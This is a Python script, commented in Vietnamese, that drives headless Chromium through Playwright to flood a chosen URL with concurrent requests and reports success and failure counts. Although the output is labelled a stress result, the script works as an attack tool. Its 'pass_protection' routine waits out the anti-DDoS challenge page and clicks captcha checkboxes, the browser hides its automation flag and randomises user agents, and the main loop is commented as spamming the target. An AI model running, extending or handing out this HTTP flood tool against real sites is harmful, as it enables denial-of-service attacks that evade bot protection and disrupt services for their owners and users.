import asyncio
import random
import time
import os
from playwright.async_api import async_playwright

# ===================== CONFIG =====================
TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
DURATION = int(os.getenv("DURATION", "20"))        # giây
CONCURRENCY = int(os.getenv("CONCURRENCY", "5"))  # số worker song song
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "3"))  # số request song song mỗi vòng/tab

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
]
ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja,en;q=0.8"]

# ===================== GLOBAL =====================
success = 0
fail = 0
status_count = {}

# ===================== HELPER =====================
async def pass_protection(page, worker_id):
    """Pass UAM + captcha nếu có"""
    try:
        print(f"[Worker {worker_id}] Visiting {TARGET_URL} to pass UAM...")
        await page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)

        # Chờ UAM 5s
        await asyncio.sleep(8)

        # Check xem có captcha checkbox không
        for frame in page.frames:
            if "captcha" in frame.url.lower():
                checkbox = await frame.query_selector("input[type=checkbox]")
                if checkbox:
                    print(f"[Worker {worker_id}] Clicking captcha checkbox...")
                    await checkbox.click()
                    await asyncio.sleep(5)  # chờ xác nhận
        print(f"[Worker {worker_id}] UAM/Captcha passed!")

    except Exception as e:
        print(f"[Worker {worker_id}] Error while passing protection: {e}")

# ===================== WORKER =====================
async def attack(playwright, worker_id):
    global success, fail, status_count

    ua = random.choice(USER_AGENTS)
    lang = random.choice(ACCEPT_LANG)

    browser = await playwright.chromium.launch(
        headless=True,
        args=[
            "--disable-web-security",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-dev-shm-usage"
        ]
    )
    context = await browser.new_context(
        user_agent=ua,
        extra_http_headers={"Accept-Language": lang}
    )
    page = await context.new_page()

    # Pass UAM + Captcha trước
    await pass_protection(page, worker_id)

    # Bắt đầu spam
    start = time.time()
    while time.time() - start < DURATION:
        tasks = []
        for _ in range(REQ_PER_LOOP):
            tasks.append(page.request.get(TARGET_URL, timeout=15000))
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in results:
            if isinstance(res, Exception):
                fail += 1
                status_count["exception"] = status_count.get("exception", 0) + 1
            else:
                if res.ok:
                    success += 1
                    status_count[res.status] = status_count.get(res.status, 0) + 1
                else:
                    fail += 1
                    status_count[res.status] = status_count.get(res.status, 0) + 1

    await browser.close()

# ===================== MAIN =====================
async def main():
    async with async_playwright() as p:
        tasks = [attack(p, i + 1) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)

    total = success + fail
    print(f"\n=== Stress Result ===")
    print(f"Total requests: {total}")
    print(f"Success (2xx): {success}")
    print(f"Fail/Blocked: {fail}")
    print(f"RPS ~ {total / DURATION:.2f}")
    print("Status breakdown:", status_count)

if __name__ == "__main__":
    asyncio.run(main())
